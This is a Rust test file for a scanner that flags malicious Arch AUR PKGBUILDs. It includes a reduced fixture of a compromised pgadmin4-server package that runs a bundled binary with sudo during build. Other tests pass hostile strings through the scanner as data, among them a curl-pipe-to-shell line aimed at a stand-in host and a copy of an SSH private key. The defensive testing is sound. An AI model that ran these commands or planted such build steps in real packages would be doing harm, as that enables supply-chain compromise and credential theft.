//! Fixtures are inline string literals, never files on disk, and no
//! fixture is ever executed — the scanner only reads text. The one
//! "binary" is four magic bytes in a byte literal.

use super::*;

fn pkg(pkgbuild: &str) -> Package {
    Package {
        name: "testpkg".into(),
        upstream: parse_upstream_url(pkgbuild.as_bytes()),
        pkgbuild: pkgbuild.as_bytes().to_vec(),
        ..Default::default()
    }
}

fn rules(r: &ScanResult) -> Vec<&str> {
    r.findings.iter().map(|f| f.rule).collect()
}

// --- the pgadmin4-server compromise, b7de293 (2026-07-29) ---
//
// Reduced from the real commit. Three tells: a local file in source=(),
// a sudo call in build(), and 3 sources against 2 checksums.

const PGADMIN_MALICIOUS: &str = r#"
pkgname=pgadmin4-server
pkgver=9.14
url='https://www.pgadmin.org/'
source=("pgadmin4-${pkgver}.tar.gz::https://ftp.postgresql.org/pub/pgadmin/pgadmin4/v${pkgver}/source/pgadmin4-${pkgver}.tar.gz"
  'parser'
  "server.patch")
sha256sums=('b8ebfa7afe41da6c2e46c12ae53e5cbbe3b3864cd91e8d5b0d79fdc51ff5c9d3'
  'd276423ab3eaa7abaf14e720c51f49cc18a528d2e1b6324d4d05257d5d58f556')

prepare() {
  cd "$srcdir/pgadmin4-${pkgver}"
  patch -p1 <"../server.patch"
}

build() {
  sudo "$srcdir/parser"
  cd "$srcdir/pgadmin4-${pkgver}"
  yarn install && yarn run bundle
}
"#;

/// The preceding clean revision, d0b7030. Identical but for the three
/// added lines — this is what makes the case a good regression test.
const PGADMIN_CLEAN: &str = r#"
pkgname=pgadmin4-server
pkgver=9.14
url='https://www.pgadmin.org/'
source=("pgadmin4-${pkgver}.tar.gz::https://ftp.postgresql.org/pub/pgadmin/pgadmin4/v${pkgver}/source/pgadmin4-${pkgver}.tar.gz"
  "server.patch")
sha256sums=('b8ebfa7afe41da6c2e46c12ae53e5cbbe3b3864cd91e8d5b0d79fdc51ff5c9d3'
  'd276423ab3eaa7abaf14e720c51f49cc18a528d2e1b6324d4d05257d5d58f556')

prepare() {
  cd "$srcdir/pgadmin4-${pkgver}"
  patch -p1 <"../server.patch"
}

build() {
  cd "$srcdir/pgadmin4-${pkgver}"
  yarn install && yarn run bundle
}
"#;

fn pgadmin_malicious() -> Package {
    let mut p = pkg(PGADMIN_MALICIOUS);
    p.name = "pgadmin4-server".into();
    p.local_files = vec![LocalFile {
        name: "parser".into(),
        head: b"\x7fELF\x02\x01\x01\x00".to_vec(),
        size: 43640,
        added: true,
    }];
    p
}

#[test]
fn pgadmin4_malicious_is_blocked() {
    let r = scan(&pgadmin_malicious());
    assert_eq!(r.verdict, Verdict::Block, "{:#?}", r.findings);
    let got = rules(&r);
    for want in [
        "privilege-escalation-in-build",
        "binary-in-source",
        "checksum-count-mismatch",
        "local-binary-added",
    ] {
        assert!(got.contains(&want), "missing {want}: {got:?}");
    }
}

#[test]
fn pgadmin4_clean_revision_is_not_blocked() {
    let r = scan(&pkg(PGADMIN_CLEAN));
    assert_ne!(r.verdict, Verdict::Block, "{:#?}", r.findings);
    // yarn is legitimate here, so the clean revision still warns. What
    // must NOT happen is the two revisions scoring the same — that is the
    // exact failure the Go scanner has.
    for absent in [
        "privilege-escalation-in-build",
        "binary-in-source",
        "checksum-count-mismatch",
        "local-binary-added",
    ] {
        assert!(!rules(&r).contains(&absent), "false positive: {absent}");
    }
}

#[test]
fn pgadmin4_revisions_are_distinguishable() {
    // The regression that motivated the content rules: `aegis aur scan`
    // produced byte-identical output for these two trees.
    let mal = scan(&pgadmin_malicious());
    let clean = scan(&pkg(PGADMIN_CLEAN));
    assert_ne!(mal.verdict, clean.verdict);
    assert!(mal.findings.len() > clean.findings.len());
}

// --- privilege-escalation-in-build ---

#[test]
fn sudo_in_build_blocks() {
    for line in [
        r#"  sudo "$srcdir/parser""#,
        "  doas /tmp/x",
        "  pkexec /tmp/x",
        "  cd /tmp && sudo ./x",
        "  true; sudo ./x",
    ] {
        let src = format!("build() {{\n{line}\n}}\n");
        let r = scan(&pkg(&src));
        assert_eq!(r.verdict, Verdict::Block, "should block: {line}");
    }
}

#[test]
fn sudo_lookalikes_do_not_fire() {
    for line in [
        "# sudo is not needed to build this",
        "  sudo_prompt=no",
        "  echo 'run sudo make install yourself'", // inside quotes, still prose
        "  _sudoers=/etc/sudoers.d",
    ] {
        let src = format!("build() {{\n{line}\n}}\n");
        let r = scan(&pkg(&src));
        assert!(
            !rules(&r).contains(&"privilege-escalation-in-build"),
            "false positive on: {line}"
        );
    }
}

// --- binary-in-source ---

#[test]
fn binary_in_source_detects_by_magic_not_extension() {
    // Named `parser` — no extension. An extension-based check cannot see
    // this, which is the whole point.
    let src = "source=('parser')\nsha256sums=('SKIP')\n";
    let mut p = pkg(src);
    p.local_files = vec![LocalFile {
        name: "parser".into(),
        head: b"\x7fELF\x02".to_vec(),
        size: 100,
        added: false,
    }];
    assert!(rules(&scan(&p)).contains(&"binary-in-source"));
}

#[test]
fn binary_magic_variants() {
    for (head, kind) in [
        (b"\x7fELF".to_vec(), "ELF"),
        (b"MZ\x90\x00".to_vec(), "PE"),
        (vec![0xcf, 0xfa, 0xed, 0xfe], "Mach-O"),
        (b"#!/bin/sh".to_vec(), "script"),
    ] {
        let mut p = pkg("source=('blob')\nsha256sums=('SKIP')\n");
        p.local_files = vec![LocalFile {
            name: "blob".into(),
            head,
            size: 10,
            added: false,
        }];
        assert!(
            rules(&scan(&p)).contains(&"binary-in-source"),
            "missed {kind}"
        );
    }
}

#[test]
fn text_local_source_is_clean() {
    // A .patch committed alongside the PKGBUILD is completely normal.
    let mut p = pkg("source=('server.patch')\nsha256sums=('abc')\n");
    p.local_files = vec![LocalFile {
        name: "server.patch".into(),
        head: b"--- a/x\n".to_vec(),
        size: 200,
        added: true,
    }];
    let r = scan(&p);
    let got = rules(&r);
    assert!(!got.contains(&"binary-in-source"), "{got:?}");
    assert!(!got.contains(&"local-binary-added"), "{got:?}");
}

#[test]
fn remote_source_is_not_treated_as_local() {
    let mut p = pkg("source=('https://example.com/parser')\nsha256sums=('abc')\n");
    p.local_files = vec![LocalFile {
        name: "parser".into(),
        head: b"\x7fELF".to_vec(),
        size: 10,
        added: false,
    }];
    assert!(!rules(&scan(&p)).contains(&"binary-in-source"));
}

// --- checksum-count-mismatch ---

#[test]
fn checksum_count_mismatch_fires() {
    let r = scan(&pkg("source=('a' 'b' 'c')\nsha256sums=('x' 'y')\n"));
    assert!(rules(&r).contains(&"checksum-count-mismatch"));
}

#[test]
fn matching_checksum_counts_are_clean() {
    let r = scan(&pkg("source=('a' 'b')\nsha256sums=('x' 'y')\n"));
    assert!(!rules(&r).contains(&"checksum-count-mismatch"));
}

#[test]
fn multiline_arrays_parse() {
    let src = "source=('a'\n  'b'\n  'c')\nsha256sums=('x'\n  'y'\n  'z')\n";
    assert!(!rules(&scan(&pkg(src))).contains(&"checksum-count-mismatch"));
}

// --- ported rules still behave ---

#[test]
fn download_exec_blocks() {
    let r = scan(&pkg("build() {\n  curl -sSL http://evil.test/p | sh\n}\n"));
    assert_eq!(r.verdict, Verdict::Block);
    assert!(rules(&r).contains(&"download-exec"));
}

#[test]
fn untrusted_host_warns() {
    let r = scan(&pkg(
        "url='https://example.com'\nsource=('https://pastebin.com/raw/x')\n",
    ));
    assert!(rules(&r).contains(&"source-untrusted-host"));
    assert_eq!(r.verdict, Verdict::Warn);
}

#[test]
fn bare_ip_source_warns() {
    let r = scan(&pkg("source=('http://192.0.2.1/x.tar.gz')\n"));
    assert!(rules(&r).contains(&"source-bare-ip"));
}

#[test]
fn ioc_package_blocks_regardless_of_content() {
    let mut p = pkg("pkgname=librewolf-fix-bin\n");
    p.name = "librewolf-fix-bin".into();
    let r = scan(&p);
    assert_eq!(r.verdict, Verdict::Block);
    assert!(rules(&r).contains(&"ioc-package"));
}

#[test]
fn credential_access_warns() {
    let r = scan(&pkg("build() {\n  cp ~/.ssh/id_rsa /tmp/x\n}\n"));
    assert!(rules(&r).contains(&"credential-access"));
}

#[test]
fn benign_pkgbuild_is_allowed() {
    let src = r#"
pkgname=hello
pkgver=1.0
url='https://github.com/example/hello'
source=("https://github.com/example/hello/archive/v${pkgver}.tar.gz")
sha256sums=('abc123')

build() {
  cd "hello-$pkgver"
  make
}
"#;
    let r = scan(&pkg(src));
    assert_eq!(r.verdict, Verdict::Allow, "{:#?}", r.findings);
}

#[test]
fn parse_upstream_url_reads_the_url_field() {
    assert_eq!(
        parse_upstream_url(b"pkgname=x\nurl='https://example.com/p'\n"),
        "https://example.com/p"
    );
    assert_eq!(parse_upstream_url(b"pkgname=x\n"), "");
}

#[test]
fn empty_package_is_allowed() {
    let r = scan(&Package::default());
    assert_eq!(r.verdict, Verdict::Allow);
    assert!(r.findings.is_empty());
}

#[test]
fn evidence_truncation_is_char_safe() {
    // A long UTF-8 line must not panic on a byte-index slice.
    let long = "é".repeat(400);
    let src = format!("build() {{\n  sudo x # {long}\n}}\n");
    let r = scan(&pkg(&src));
    assert_eq!(r.verdict, Verdict::Block);
}
